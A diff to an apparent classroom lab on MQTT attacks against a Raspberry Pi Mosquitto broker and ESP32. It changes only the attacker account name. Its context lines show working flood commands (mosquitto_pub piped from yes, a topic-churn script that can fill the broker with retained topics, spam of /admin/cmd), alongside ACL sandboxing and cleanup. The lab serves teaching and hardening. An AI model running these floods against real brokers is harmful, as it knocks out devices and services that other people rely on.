@@ -19,7 +19,7 @@ We’ll do 3 mini-attacks and then lock things down.
 
   * **Subscribes to `/admin/cmd`** (LED control)
   * Publishes DHT to `/esp32/sensor`
-* “Attacker” user: `attacker2` (we’ll allow it to publish only under `flood/#` for safety, and optionally to `/admin/cmd` during the demo phase)
+* “Attacker” user: `attacker5` (we’ll allow it to publish only under `flood/#` for safety, and optionally to `/admin/cmd` during the demo phase)
 
 ---
 
@@ -51,7 +51,7 @@ In `/etc/mosquitto/acl` add a sandbox where the attacker can write:
 
 ```conf
 # Attacker flood sandbox ONLY (safe space for the demo)
-user attacker2
+user attacker5
 topic write flood/#
 # (Optionally, to show client impact on ESP32, TEMPORARILY allow /admin/cmd)
 # topic write /admin/cmd
@@ -72,7 +72,7 @@ sudo systemctl restart mosquitto
 This hammers **one topic** with thousands of messages over **one connection**:
 
 ```bash
-yes "x" | head -n 50000 | mosquitto_pub -u attacker2 -P attackerpass -h <RPI_IP> -t flood/rate -l -q 1
+yes "x" | head -n 50000 | mosquitto_pub -u attacker5 -P attackerpass -h <RPI_IP> -t flood/rate -l -q 1
 ```
 
 * `-l` reads lines from stdin as messages (single connection, very fast)
@@ -120,7 +120,7 @@ client.disconnect()
 Run it:
 
 ```bash
-python3 attacker_topic_churn.py --host <RPI_IP> --user attacker2 --pw attackerpass --count 20000 --qos 1
+python3 attacker_topic_churn.py --host <RPI_IP> --user attacker5 --pw attackerpass --count 20000 --qos 1
 ```
 
 **Optional (worse):** add `--retain` to **fill the broker** with 20k retained topics.
@@ -138,7 +138,7 @@ python3 attacker_topic_churn.py --host <RPI_IP> --user attacker2 --pw attackerpa
 *(Do this only briefly — it will spam the ESP32 callback.)*
 
 ```bash
-yes "on" | head -n 20000 | mosquitto_pub -u attacker2 -P attackerpass -h <RPI_IP> -t /admin/cmd -l -q 1
+yes "on" | head -n 20000 | mosquitto_pub -u attacker5 -P attackerpass -h <RPI_IP> -t /admin/cmd -l -q 1
 ```
 
 **Expected effect**
@@ -156,7 +156,7 @@ yes "on" | head -n 20000 | mosquitto_pub -u attacker2 -P attackerpass -h <RPI_IP
   ```bash
   # Clear all retained flood topics (scripted)
   for i in $(seq -w 000000 019999); do
-    mosquitto_pub -u attacker2 -P attackerpass -h <RPI_IP> -t flood/$i -n -r
+    mosquitto_pub -u attacker5 -P attackerpass -h <RPI_IP> -t flood/$i -n -r
   done
   ```
 * Consider purging retained entries by **overwriting with empty** payloads (as above).
